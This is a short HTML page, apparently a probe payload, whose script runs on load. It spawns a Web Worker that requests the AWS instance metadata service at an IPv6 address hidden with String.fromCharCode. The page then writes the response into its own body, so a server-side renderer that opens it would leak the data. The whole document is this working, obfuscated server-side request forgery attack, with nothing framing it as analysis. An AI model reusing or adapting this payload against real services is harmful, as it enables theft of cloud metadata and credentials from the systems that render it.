<!DOCTYPE html>
<html><body>
<h1>WORKER_TEST</h1>
<div id="r1">LOADING</div>
<script>
var workerCode = 'self.onmessage = function(e) {' +
  'try {' +
  '  var xhr = new XMLHttpRequest();' +
  '  var ip = String.fromCharCode(102,100,48,48,58,101,99,50,58,58,50,53,52);' +
  '  var proto = String.fromCharCode(104,116,116,112);' +
  '  xhr.open("GET", proto + "://[" + ip + "]/latest/meta-data/", false);' +
  '  xhr.send();' +
  '  self.postMessage("STATUS:" + xhr.status + " BODY:" + xhr.responseText.substr(0,2000));' +
  '} catch(err) {' +
  '  self.postMessage("ERROR:" + err.name + ":" + err.message);' +
  '}' +
  '};';

try {
  var blob = new Blob([workerCode], {type: 'application/javascript'});
  var worker = new Worker(URL.createObjectURL(blob));
  worker.onmessage = function(e) {
    document.getElementById('r1').innerText = 'WORKER_RESULT:' + e.data;
  };
  worker.onerror = function(e) {
    document.getElementById('r1').innerText = 'WORKER_ERROR:' + e.message;
  };
  worker.postMessage('go');
} catch(e) {
  document.getElementById('r1').innerText = 'WORKER_CREATE_ERROR:' + e.name + ':' + e.message;
}
</script>
</body></html>
